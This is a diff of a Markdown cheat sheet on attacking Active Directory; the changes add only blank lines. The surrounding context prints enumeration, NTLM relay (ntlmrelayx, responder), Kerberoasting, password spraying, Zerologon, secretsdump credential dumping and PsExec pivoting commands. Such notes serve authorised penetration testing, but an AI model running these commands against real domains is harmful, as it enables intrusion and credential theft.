@@ -2,6 +2,7 @@
 
 
 **Note:** Try as much as possible to [Live off the land](https://lolbas-project.github.io/)
+
 ## Good blogs for these:
 * [BHIS - Finding Buried Treasure SMB](https://www.blackhillsinfosec.com/finding-buried-treasure-in-server-message-block-smb/)
 
@@ -33,7 +34,9 @@ net group "<group>" /domain
 net group "domain admins" /domain
 klist
 ```
+
 ---
+
 ## NLTest[^1]
        
 ```batch
@@ -41,7 +44,9 @@ nltest /dclist:<domain>
 nltest /dsgetdc:<domain>
 nltest /domain_trusts /all_trusts
 ```
+
 ---
+
 ## Powershell Enumeration[^1]
 
 ```powershell        
@@ -56,10 +61,16 @@ nltest /domain_trusts /all_trusts
 * Bloodhound (Below)
 * Local Privilege Escalation
     * [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+
+
 ---
 
+
 ## [Dumping credentials](./Post_Exploitation.html#dumping-credentials1)
+
 ---
+
 ## Bloodhound (Sharphound)[^2] 
 
 1. On local machine  (~Kali)
@@ -115,6 +126,7 @@ sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
             * If you're Windows attacking VM is connected to the network, just [run mmc as a domain user](./Initial_Foothold.html#rsat) (provided you already have the domain user's credentials). 
             
 ---
+
 ## NTLM Relaying
 * Basic NTLM Relay
     * Gather NTLM Relay list using crackmapexec
@@ -123,7 +135,9 @@ sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
 sudo impacket-ntlmrelayx -socks -smb2support -of output.txt -tf ./relay_list.txt -c ipconfig
 sudo responder -I eth1 -Pvd
 ```
+
 ---
+
 ## General Attack methods
 * Methods [^5][^6]
      * NTLM Relay[^18]
@@ -142,7 +156,10 @@ sudo responder -I eth1 -Pvd
      * Over-Pass-the-Hash
          * Requires access as user.
          * Use to pivot
+
+
 ---
+
 
 ## Kerberoasting
 1. From Linux [^1][^7]
@@ -191,6 +208,7 @@ adfind.exe -sc trustdmp
 ```
 
 ---
+
 ## ADRecon[^10]
 ```powershell
 # On your own Windows VM after "runas" command
@@ -198,6 +216,7 @@ adfind.exe -sc trustdmp
 ```
 
 ---
+
 ## RSAT
 * Run RSAT from a non-domain joined PC
 ```batch
@@ -207,6 +226,7 @@ runas /netonly /user:ACME\bob.normal.user "mmc /server=dc01.acme.local"
 
 
 ---
+
 ## Domain Password Spraying
 ### Dafthack's DomainPasswordSpray[^11]
 * Retrieves the list of domain users, sprays and attempts to detect lockout threshold of a user and stops spraying
@@ -216,6 +236,7 @@ Invoke-DomainPasswordSpray -Password Spring2017
 ```
 
 ---
+
 
 ## Find interesting Domain Share Files[^12]
 * Find-InterestingDomainShareFile
@@ -234,6 +255,7 @@ Invoke-DomainPasswordSpray -Password Spring2017
     ```
 
 ---
+
 ## Direct Attacks to the Domain Controller
 ### Zerologon [^16][^17]
 * Resets machine account of vulnerable domain controller
@@ -277,6 +299,7 @@ secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20
 ```
 
 ---
+
 ## Pivoting
 ### Executing Commands Remotely
 #### PsExec
@@ -308,6 +331,7 @@ secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20
     ```powershell
     Remove-PSSession -Id <#>
     ```
+
 
 #### Windows Remote Management
 ```batch
